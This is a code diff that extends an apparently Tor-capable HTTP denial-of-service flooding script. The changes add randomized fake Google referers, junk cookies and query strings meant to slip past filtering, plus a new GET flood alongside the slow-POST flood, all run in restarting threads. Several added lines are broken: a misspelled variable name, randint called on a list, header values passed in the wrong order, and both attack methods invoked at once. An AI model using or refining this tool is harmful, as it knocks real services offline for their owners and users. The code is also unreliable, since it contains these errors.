@@ -65,7 +65,32 @@ useragents = [
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.517 Safari/537.36",
  "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
 ]
+referers = [
+	"https://www.google.com/search?q=",
+	"https://www.google.co.uk/search?q=",
+	"https://www.google.cn/search?q=",
+	"https://www.google.com.hk/search?q=",
+	"https://www.google.co.ph/search?q=",
+]
 
+def buildblock(size):
+	out_str=''
+	_LOWERCASE = range(97, 122)
+	_UPPERCASE = range(65, 90)
+	_NUMERIC = range(48, 57)
+	validChars = _LOWECASE + _UPPERCASE + _NUMERIC
+	for i in range(0, size):
+		a = random.choice(validChars)
+		out_str += chr(a)
+	return(out_str)
+def querystring(ammount=1):
+	queryString = []
+	for i in range(ammount):
+		key = buildblock(random.randint(3,10))
+		value = buildblock(random.randint(3,20))
+		element = "{0}={1}".format(key, value)
+		queryString.append(element)
+	return '&'.join(queryString)
 class httpPost(Thread):
     def __init__(self, host, port, tor):
         Thread.__init__(self)
@@ -82,11 +107,25 @@ class httpPost(Thread):
                         "Host: %s\r\n"
                         "User-Agent: %s\r\n"
                         "Connection: keep-alive\r\n"
+                        "Referer: %s\r\n"
+                        "Cookie: %s\r\n"
                         "Keep-Alive: %s\r\n" 
                         "Content-Length: 99768\r\n"
                         "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
-                        (self.host, random.choice(useragents), random.randint(300, 894)))
+                        (self.host, random.randint(useragents), random.randint(300, 894), random.choice(referers) + buildblock(random.randint(5,10)), querystring(random.randint(1, 5))))
+    def _send_http_get(self, pause=random.randint(5,10)):
+	global stop_now
 
+	self.socks.send("GET / HTTP/1.1\r\n"
+			"Host: %s\r\n"
+			"User-Agent: %s\r\n"
+			"Connection: keep-alive\r\n"
+			"Keep-Alive: %s\r\n"
+			"Accept-Encoding: gzip\r\n"
+			"Accept-Language: en\r\n"
+			"Referer: %s\r\n"
+			"Cookie: %s\r\n" %
+			(self.host, random.choice(useragents), random.randint(300,894), random.choice(referers) + buildblock(random.randint(5,10)), querystring(random.randint(1, 5))))
         for i in range(0, 9999):
             if stop_now:
                 self.running = False
@@ -116,7 +155,7 @@ class httpPost(Thread):
 	
             while self.running:
                 try:
-                    self._send_http_post()
+                    random.choice([self._send_http_post(), self._send_http_get()])
                 except Exception, e:
                     if e.args[0] == 32 or e.args[0] == 104:
                         print term.BOL+term.UP+term.CLEAR_EOL+"Thread broken, restarting..."+ term.NORMAL
